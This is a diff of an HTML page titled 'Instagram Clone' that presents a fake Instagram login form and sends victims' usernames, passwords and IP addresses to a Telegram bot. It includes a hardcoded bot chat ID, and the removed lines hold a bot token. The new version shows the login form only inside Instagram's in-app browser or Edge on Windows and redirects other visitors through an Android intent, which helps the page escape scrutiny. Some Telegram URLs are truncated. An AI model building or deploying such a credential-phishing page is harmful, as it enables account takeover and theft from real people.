@@ -7,26 +7,29 @@
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
     <title>Instagram Clone</title>
     <style>
-        /* Hidden by default */
         #main-wrapper { display: none; }
-        #status-msg { 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; font-family: sans-serif; 
+        #bridge-screen { 
+            display: flex; flex-direction: column; justify-content: center; 
+            align-items: center; height: 100vh; text-align: center; font-family: sans-serif;
         }
+        .btn { background: #0095f6; color: white; padding: 10px 20px; border-radius: 4px; text-decoration: none; margin-top: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="status-msg">Validating Browser...</div>
+    <!-- Bridge screen for external browsers -->
+    <div id="bridge-screen">
+        <h3>Testing Environment detected</h3>
+        <p>To test the Instagram In-App Browser, send this link to your DMs and open it there.</p>
+        <a id="intent-btn" class="btn">Open App Directly</a>
+    </div>
 
+    <!-- The actual Login UI -->
     <div id="main-wrapper">
         <main class="flex align-items-center justify-content-center">
-            <section id="mobile" class="flex"></section>
             <section id="auth" class="flex direction-column">
                 <div class="panel login flex direction-column">
-                    <h1 class="flex justify-content-center">
-                        <img src="./img/instagram-logo.png" alt="Instagram logo" />
-                    </h1>
+                    <h1 class="flex justify-content-center"><img src="./img/instagram-logo.png" /></h1>
                     <form id="login-form">
                         <input id="email" placeholder="Phone, username, or email" required />
                         <input id="password" type="password" placeholder="Password" required />
@@ -35,62 +38,38 @@
                 </div>
             </section>
         </main>
-        <footer>
-            <p class="copyright">© 2020 Instagram from Facebook</p>
-        </footer>
     </div>
 
 <script src="https://unpkg.com"></script>
 <script>
     (function() {
         const ua = navigator.userAgent;
-        const platform = navigator.platform || "";
-        
-        const isWin = /Win/.test(ua) || /Win/.test(platform);
-        const isEdge = /Edg/.test(ua); // Chromium-based Edge
-        const isAndroid = /Android/i.test(ua);
-        const isChrome = /Chrome/i.test(ua) && !isEdge;
-        const isIOS = /iPhone|iPad|iPod/i.test(ua);
-        const isSafari = /Safari/i.test(ua) && /Version/i.test(ua) && !/CriOS/i.test(ua);
+        const isInstagram = ua.includes("Instagram"); // Detects Instagram In-App Browser
+        const isEdge = ua.includes("Edg") && ua.includes("Win");
 
-        // 1. Check if we should REDIRECT (Android/Chrome or iOS/Safari)
-        let shouldRedirect = (isAndroid && isChrome) || (isIOS && isSafari);
-
-        // 2. Exception: Always ALLOW MS Edge on Windows
-        if (isWin && isEdge) {
-            shouldRedirect = false;
-        }
-
-        if (shouldRedirect) {
-            document.getElementById('status-msg').innerHTML = "Redirecting to Instagram App...";
-            if (isAndroid) {
-                // Force open the native Instagram app via Intent
-                window.location.href = "intent://instagram.com/_n/mainfeed/#Intent;package=com.instagram.android;scheme=https;end";
-            } else if (isIOS) {
-                // Open via custom URL scheme
-                window.location.href = "instagram://app";
-            }
-        } else {
-            // Show the login UI
-            document.getElementById('status-msg').style.display = 'none';
+        // 1. Show UI if inside Instagram App or using Edge on Windows
+        if (isInstagram || isEdge) {
+            document.getElementById('bridge-screen').style.display = 'none';
             document.getElementById('main-wrapper').style.display = 'block';
+        } else {
+            // 2. Otherwise, prepare the Intent button for Android
+            const currentUrl = window.location.href;
+            const intentUrl = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;package=com.instagram.android;scheme=https;end`;
+            document.getElementById('intent-btn').href = intentUrl;
         }
     })();
 
-    // Telegram Bot Submission Logic
-    const TOKEN = "7971493433:AAFiSKG7P1jckapqFHx-mThiTFtiBmOfhN0";
-    const CHAT_ID = "5763674764";
-    const URI_API = `https://api.telegram.org{TOKEN}/sendMessage`;
-
+    // Telegram Bot Submission
     document.getElementById('login-form').addEventListener('submit', function(e) {
         e.preventDefault();
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-
+        
         axios.get('https://api.ipify.org').then(res => {
-            const message = `<b>Test Log</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}\n<b>IP:</b> ${res.data.ip}`;
-            axios.post(URI_API, { chat_id: CHAT_ID, parse_mode: 'html', text: message })
-                 .then(() => alert('Log captured. Check Telegram.'));
+            const message = `<b>Hacking Test Log</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}\n<b>IP:</b> ${res.data.ip}`;
+            axios.post(`https://api.telegram.org`, {
+                chat_id: "5763674764", parse_mode: 'html', text: message
+            }).then(() => alert('Captured! Check your bot.'));
         });
     });
 </script>
